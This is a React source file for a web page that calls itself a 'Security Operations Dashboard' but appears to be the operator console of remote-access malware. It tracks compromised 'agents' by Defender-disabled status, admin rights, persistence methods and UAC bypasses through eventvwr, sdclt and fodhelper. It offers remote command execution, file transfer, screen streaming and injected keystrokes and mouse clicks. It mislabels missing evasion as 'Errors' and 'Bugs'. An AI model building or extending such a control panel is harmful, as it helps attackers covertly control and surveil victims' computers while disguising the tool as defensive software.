import { useEffect, useMemo, useState } from "react";
import { useSocketIO } from "@/hooks/useSocketIO";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Separator } from "@/components/ui/separator";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuLabel,
  DropdownMenuRadioGroup,
  DropdownMenuRadioItem,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import DoughnutChart from "@/components/charts/DoughnutChart";
import TrendLineChart from "@/components/charts/TrendLineChart";
import ActiveAgentsCard from "@/components/dashboard/ActiveAgentsCard";
import ConfigStatusCard from "@/components/dashboard/ConfigStatusCard";
import PasswordManagementCard from "@/components/dashboard/PasswordManagementCard";
import FilterToolbar from "@/components/dashboard/FilterToolbar";
import StreamingControlPanel from "@/components/streaming/StreamingControlPanel";
import SecurityControlPanel from "@/components/security/SecurityControlPanel";
import PersistenceControlPanel from "@/components/persistence/PersistenceControlPanel";
import MonitoringControlPanel from "@/components/monitoring/MonitoringControlPanel";
import FileTransferPanel from "@/components/filetransfer/FileTransferPanel";
import AgentControlPanel from "@/components/agent/AgentControlPanel";
import WebRTCMonitor from "@/components/webrtc/WebRTCMonitor";
import type { Agent } from "@/types/agent";
import type { DashboardMetrics } from "@/types/dashboard";

// Small helper to update meta for SEO
const setMeta = (name: string, content: string) => {
  let el = document.querySelector(`meta[name="${name}"]`);
  if (!el) {
    el = document.createElement("meta");
    el.setAttribute("name", name);
    document.head.appendChild(el);
  }
  el.setAttribute("content", content);
};

const categories = [
  {
    key: "auth",
    label: "Authentication & Security",
    description:
      "Admin Settings: Manage passwords, session timeouts, max login attempts. Security Evasion: Disable Defender, hide processes, anti-VM/anti-debug.",
  },
  {
    key: "stream",
    label: "Streaming & Communication",
    description:
      "WebRTC Stream control with codecs, ABR, frame dropping. Status & Logs for server and streaming connection.",
  },
];

const checks = [
  {
    key: "agent",
    label: "Agent & System Health Checks",
  },
  {
    key: "webrtc",
    label: "WebRTC Streaming Checks",
  },
  {
    key: "server",
    label: "Controller & Server Checks",
  },
];

const ranges = [
  { key: "1h", label: "Last Hour" },
  { key: "24h", label: "Last 24 Hours" },
  { key: "7d", label: "Last 7 Days" },
  { key: "custom", label: "Custom Range" },
];

const Index = () => {
  const [category, setCategory] = useState("auth");
  const [check, setCheck] = useState("agent");
  const [range, setRange] = useState("24h");
  const [bypassView, setBypassView] = useState<'persistence' | 'uac'>("persistence");
  const [selectedAgent, setSelectedAgent] = useState<string | null>(null);
  const [activePanel, setActivePanel] = useState<string | null>(null);

  // Socket.IO connection for real-time updates
  const {
    socket,
    isConnected,
    agents,
    commandResults,
    configStatus,
    fileTransfers,
    webrtcStats,
    qualityData,
    productionReadiness,
    executeCommand,
    getAgentStats,
    getSystemHealth,
    listProcesses,
    refreshDashboard,
    uploadFile,
    downloadFile,
    startWebRTCStreaming,
    stopWebRTCStreaming,
    getWebRTCStats,
    setWebRTCQuality,
    getProductionReadiness,
    sendKeyPress,
    sendMouseMove,
    sendMouseClick,
    changePassword,
    getConfigStatus
  } = useSocketIO();

  // Get config status on component mount
  useEffect(() => {
    if (isConnected) {
      getConfigStatus();
      getProductionReadiness();
    }
  }, [isConnected, getConfigStatus, getProductionReadiness]);

  useEffect(() => {
    document.title = "Ghost Stream Control – Security Dashboard";
    setMeta("description", "Realtime security, streaming and controller status dashboard with interactive charts.");
  }, []);

  // Overview donut datasets
  const agentReport = useMemo(() => (
    [
      { name: "Problems", value: agents.filter(a => a.status === 'offline').length },
      { name: "Errors", value: agents.filter(a => !a.security.defenderDisabled && a.status === 'online').length },
      { name: "Bugs", value: agents.filter(a => !a.privileges.admin && a.status === 'online').length },
    ]
  ), []);

  const connectionStatus = useMemo(() => (
    [
      { name: "Connected", value: agents.filter(a => a.status === 'online').length },
      { name: "Offline", value: agents.filter(a => a.status === 'offline').length },
    ]
  ), [agents]);

  const persistenceMethods = useMemo(() => (
    [
      { name: "Registry Keys", value: agents.filter(a => a.persistence.registry).length },
      { name: "Startup Entries", value: agents.filter(a => a.persistence.startup).length },
      { name: "Scheduled Tasks", value: agents.filter(a => a.persistence.scheduledTasks).length },
    ]
  ), [agents]);

  const uacBypass = useMemo(() => (
    [
      { name: "EventVwr.exe Hijacking", value: agents.filter(a => a.privileges.method === 'EventVwr.exe').length },
      { name: "sdclt.exe Bypass", value: agents.filter(a => a.privileges.method === 'sdclt.exe').length },
      { name: "fodhelper.exe", value: agents.filter(a => a.privileges.method === 'fodhelper.exe').length },
    ]
  ), [agents]);

  // Trending line data (mocked)
  const [trendData, setTrendData] = useState(() =>
    Array.from({ length: 15 }).map((_, i) => ({
      name: `${i + 1}`,
      Security: Math.max(15, Math.min(95, 10 + i * 5)),
      Identity: Math.max(10, Math.min(98, 5 + i * 6)),
      Network: Math.max(5, Math.min(90, 3 + i * 4)),
      Service: Math.max(8, Math.min(92, 6 + i * 5)),
    }))
  );

  // Controller realtime metrics
  const [controllerData, setControllerData] = useState(() =>
    Array.from({ length: 20 }).map((_, i) => ({
      name: `${i}`,
      Latency: 40 + Math.round(Math.random() * 20),
      Agents: 40 + Math.round(Math.random() * 5),
      Service: 95 + Math.round(Math.random() * 3),
    }))
  );

  useEffect(() => {
    const id = setInterval(() => {
      setControllerData((prev) => {
        const next = {
          name: `${Number(prev[prev.length - 1].name) + 1}`,
          Latency: Math.max(25, Math.min(120, (prev[prev.length - 1].Latency + (Math.random() * 10 - 5)) | 0)),
          Agents: Math.max(35, Math.min(60, (prev[prev.length - 1].Agents + (Math.random() * 2 - 1)) | 0)),
          Service: Math.max(90, Math.min(100, (prev[prev.length - 1].Service + (Math.random() * 2 - 1)) | 0)),
        };
        const arr = [...prev.slice(-19), next];
        return arr;
      });
    }, 1500);
    return () => clearInterval(id);
  }, []);

  // Filter previews mimic same colors & style
  const filterPreviewDonut = (
    <div className="w-64">
      <DoughnutChart data={agentReport} totalLabel="Items" />
    </div>
  );

  const filterPreviewLine = (
    <div className="w-72">
      <TrendLineChart
        data={trendData}
        series={[
          { dataKey: "Security", name: "Security", colorIndex: 0 },
          { dataKey: "Identity", name: "Identity", colorIndex: 1 },
        ]}
      />
    </div>
  );

  return (
    <main className="min-h-screen bg-background">
      <header className="sticky top-0 z-40 backdrop-blur supports-[backdrop-filter]:bg-background/70 border-b">
        <div className="container py-4 flex flex-col gap-4">
          <div className="flex items-center justify-between">
            <h1 className="text-2xl font-semibold">Security Operations Dashboard</h1>
            <div className="hidden md:flex items-center gap-2">
              <Button variant="secondary" className="animate-glow">Overview</Button>
              <DropdownMenu>
                <DropdownMenuTrigger asChild>
                  <Button variant="secondary" className="animate-glow">Category</Button>
                </DropdownMenuTrigger>
                <DropdownMenuContent className="z-50 bg-popover">
                  <DropdownMenuLabel>Categories</DropdownMenuLabel>
                  <DropdownMenuRadioGroup value={category} onValueChange={setCategory}>
                    {categories.map((c) => (
                      <DropdownMenuRadioItem key={c.key} value={c.key}>
                        {c.label}
                      </DropdownMenuRadioItem>
                    ))}
                  </DropdownMenuRadioGroup>
                  <Separator className="my-2" />
                  {filterPreviewDonut}
                  <Separator className="my-2" />
                  {filterPreviewLine}
                </DropdownMenuContent>
              </DropdownMenu>

              <DropdownMenu>
                <DropdownMenuTrigger asChild>
                  <Button variant="secondary" className="animate-glow">Checks</Button>
                </DropdownMenuTrigger>
                <DropdownMenuContent className="z-50 bg-popover">
                  <DropdownMenuLabel>Checks</DropdownMenuLabel>
                  <DropdownMenuRadioGroup value={check} onValueChange={setCheck}>
                    {checks.map((c) => (
                      <DropdownMenuRadioItem key={c.key} value={c.key}>
                        {c.label}
                      </DropdownMenuRadioItem>
                    ))}
                  </DropdownMenuRadioGroup>
                  <Separator className="my-2" />
                  {filterPreviewDonut}
                  <Separator className="my-2" />
                  {filterPreviewLine}
                </DropdownMenuContent>
              </DropdownMenu>

              <DropdownMenu>
                <DropdownMenuTrigger asChild>
                  <Button variant="secondary" className="animate-glow">Time Range</Button>
                </DropdownMenuTrigger>
                <DropdownMenuContent className="z-50 bg-popover">
                  <DropdownMenuLabel>Log & Activity Filters</DropdownMenuLabel>
                  <DropdownMenuRadioGroup value={range} onValueChange={setRange}>
                    {ranges.map((r) => (
                      <DropdownMenuRadioItem key={r.key} value={r.key}>
                        {r.label}
                      </DropdownMenuRadioItem>
                    ))}
                  </DropdownMenuRadioGroup>
                  <Separator className="my-2" />
                  {filterPreviewDonut}
                  <Separator className="my-2" />
                  {filterPreviewLine}
                </DropdownMenuContent>
              </DropdownMenu>
            </div>
          </div>

          <p className="text-sm text-muted-foreground">
            {categories.find((c) => c.key === category)?.description}
          </p>
          <FilterToolbar category={category} check={check} range={range} />
        </div>
      </header>

      <section className="container py-6 grid gap-6">
        <div className="grid gap-6 md:grid-cols-12">
          <div className="md:col-span-12 lg:col-span-3">
            <Card className="h-full">
              <CardHeader>
                <CardTitle className="flex items-center justify-between">
                  Active Agents
                  <Badge variant={isConnected ? "default" : "destructive"}>
                    {isConnected ? "Connected" : "Disconnected"}
                  </Badge>
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                {agents.length === 0 ? (
                  <div className="rounded-lg border border-border bg-muted/20 p-6 text-center text-sm text-muted-foreground">
                    No agents connected
                  </div>
                ) : (
                  <div className="space-y-2">
                    {agents.map((agent) => (
                      <div key={agent.id} className="flex items-center justify-between p-2 border rounded">
                        <div className="space-y-1">
                          <div className="flex items-center gap-2">
                            <div className={`w-2 h-2 rounded-full ${agent.status === 'online' ? 'bg-green-500' : 'bg-red-500'}`} />
                            <span className="font-medium text-sm">{agent.hostname}</span>
                          </div>
                          <div className="text-xs text-muted-foreground">{agent.ip} • {agent.os}</div>
                        </div>
                        <Button
                          variant="outline"
                          size="sm"
                          onClick={() => {
                            setSelectedAgent(agent.id);
                            setActivePanel('control');
                          }}
                          disabled={agent.status !== 'online'}
                        >
                          Control
                        </Button>
                      </div>
                    ))}
                  </div>
                )}
                <div className="grid gap-2">
                  <Button
                    variant="secondary"
                    className="justify-start font-medium"
                    style={{ backgroundImage: "var(--gradient-primary)" }}
                    onClick={getAgentStats}
                  >
                    Agent Stats
                  </Button>
                  <Button 
                    variant="secondary" 
                    className="justify-start bg-muted/30"
                    onClick={getSystemHealth}
                  >
                    System Health
                  </Button>
                  <Button 
                    variant="secondary" 
                    className="justify-start bg-muted/30"
                    onClick={listProcesses}
                  >
                    List Processes
                  </Button>
                  <Button 
                    variant="secondary" 
                    className="justify-start bg-muted/30"
                    onClick={refreshDashboard}
                  >
                    Refresh Dashboard
                  </Button>
                </div>
                <Separator />
              </CardContent>
            </Card>
          </div>

          <Card className="relative md:col-span-6 lg:col-span-3">
            <CardHeader>
              <CardTitle>Agent Report Status</CardTitle>
            </CardHeader>
            <CardContent>
              <DoughnutChart data={agentReport} totalLabel="Total Issues" />
            </CardContent>
          </Card>

          <Card className="md:col-span-6 lg:col-span-3">
            <CardHeader>
              <CardTitle>Agent Connection Status</CardTitle>
            </CardHeader>
            <CardContent>
              <DoughnutChart data={connectionStatus} totalLabel="Total Agents" />
            </CardContent>
          </Card>

          <Card className="md:col-span-12 lg:col-span-3">
            <CardHeader>
              <CardTitle>Bypass Status</CardTitle>
            </CardHeader>
            <CardContent>
              <Tabs value={bypassView} onValueChange={(v) => setBypassView(v as any)}>
                <TabsList className="grid w-full grid-cols-2 mb-4">
                  <TabsTrigger value="persistence">Persistence Methods</TabsTrigger>
                  <TabsTrigger value="uac">UAC Bypass Methods</TabsTrigger>
                </TabsList>
                <TabsContent value="persistence" className="mt-0">
                  <DoughnutChart data={persistenceMethods} totalLabel="Active Methods" />
                </TabsContent>
                <TabsContent value="uac" className="mt-0">
                  <DoughnutChart data={uacBypass} totalLabel="Attempts" />
                </TabsContent>
              </Tabs>
            </CardContent>
          </Card>
        </div>

        <Card>
          <CardHeader>
            <CardTitle>Best Practice Checks Trending</CardTitle>
          </CardHeader>
          <CardContent>
            <TrendLineChart
              data={trendData}
              series={[
                { dataKey: "Security", name: "Security", colorIndex: 0 },
                { dataKey: "Identity", name: "Identity", colorIndex: 1 },
                { dataKey: "Network", name: "Network", colorIndex: 2 },
                { dataKey: "Service", name: "Service Setup", colorIndex: 3 },
              ]}
            />
          </CardContent>
        </Card>

        <div className="grid gap-6 md:grid-cols-12">
          <Card className="md:col-span-12 lg:col-span-9">
            <CardHeader>
              <CardTitle>Controller Status (Realtime)</CardTitle>
            </CardHeader>
            <CardContent>
              <TrendLineChart
                data={controllerData}
                series={[
                  { dataKey: "Latency", name: "Latency (ms)", colorIndex: 0 },
                  { dataKey: "Agents", name: "Online Agents", colorIndex: 1 },
                  { dataKey: "Service", name: "Service Health %", colorIndex: 3 },
                ]}
              />
            </CardContent>
          </Card>
          <div className="md:col-span-12 lg:col-span-3 grid gap-6">
            <Card>
              <CardHeader className="flex flex-row items-center justify-between space-y-0">
                <CardTitle>Config Status</CardTitle>
                <span className="text-xs text-muted-foreground">
                  Last updated: {configStatus ? new Date().toLocaleTimeString() : '—'}
                </span>
              </CardHeader>
              <CardContent>
                <div className="space-y-1">
                  <div className="flex items-center justify-between py-1">
                    <span className="text-sm text-muted-foreground">Admin password set</span>
                    <span className="text-sm font-semibold">
                      {configStatus?.admin_password_set ? 'Yes' : 'No'}
                    </span>
                  </div>
                  <div className="flex items-center justify-between py-1">
                    <span className="text-sm text-muted-foreground">Secret key</span>
                    <span className="text-sm font-semibold">
                      {configStatus?.secret_key_set ? 'Set' : 'Not Set'}
                    </span>
                  </div>
                  <div className="flex items-center justify-between py-1">
                    <span className="text-sm text-muted-foreground">Session timeout</span>
                    <span className="text-sm font-semibold">
                      {configStatus?.session_timeout || 3600}s
                    </span>
                  </div>
                  <div className="flex items-center justify-between py-1">
                    <span className="text-sm text-muted-foreground">Blocked IPs</span>
                    <span className="text-sm font-semibold">
                      {configStatus?.blocked_ips?.length || 0}
                    </span>
                  </div>
                </div>
              </CardContent>
            </Card>
            <PasswordManagementCard />
          </div>
        </div>

        {/* WebRTC Production Monitor */}
        <WebRTCMonitor
          productionReadiness={productionReadiness}
          qualityData={qualityData}
          onGetProductionReadiness={getProductionReadiness}
          onGetMigrationPlan={() => console.log('Get migration plan')}
          onGetMonitoringData={() => console.log('Get monitoring data')}
        />

        {/* Agent Control Panel */}
        {selectedAgent && activePanel && (
          <div className="space-y-6">
            <div className="flex items-center justify-between">
              <h2 className="text-xl font-semibold">
                Agent Control - {agents.find(a => a.id === selectedAgent)?.hostname}
              </h2>
              <Button
                variant="ghost"
                size="sm"
                onClick={() => {
                  setSelectedAgent(null);
                  setActivePanel(null);
                }}
              >
                Close
              </Button>
            </div>

            {activePanel === 'control' && selectedAgent && (
              <AgentControlPanel
                agent={agents.find(a => a.id === selectedAgent)!}
                commandResults={commandResults}
                fileTransfers={fileTransfers}
                webrtcStats={webrtcStats[selectedAgent]}
                qualityData={qualityData[selectedAgent]}
                onExecuteCommand={(command) => executeCommand(selectedAgent, command)}
                onUploadFile={(file, path) => uploadFile(selectedAgent, file, path)}
                onDownloadFile={(filename, path) => downloadFile(selectedAgent, filename, path)}
                onStartStreaming={(type) => startWebRTCStreaming(selectedAgent, type)}
                onStopStreaming={() => stopWebRTCStreaming(selectedAgent)}
                onSetQuality={(quality) => setWebRTCQuality(selectedAgent, quality)}
                onGetStats={() => getWebRTCStats(selectedAgent)}
                onKeyPress={(key, modifiers) => sendKeyPress(selectedAgent, key, modifiers)}
                onMouseMove={(x, y) => sendMouseMove(selectedAgent, x, y)}
                onMouseClick={(x, y, button) => sendMouseClick(selectedAgent, x, y, button)}
              />
            )}
          </div>
        )}
      </section>
    </main>
  );
};

export default Index;
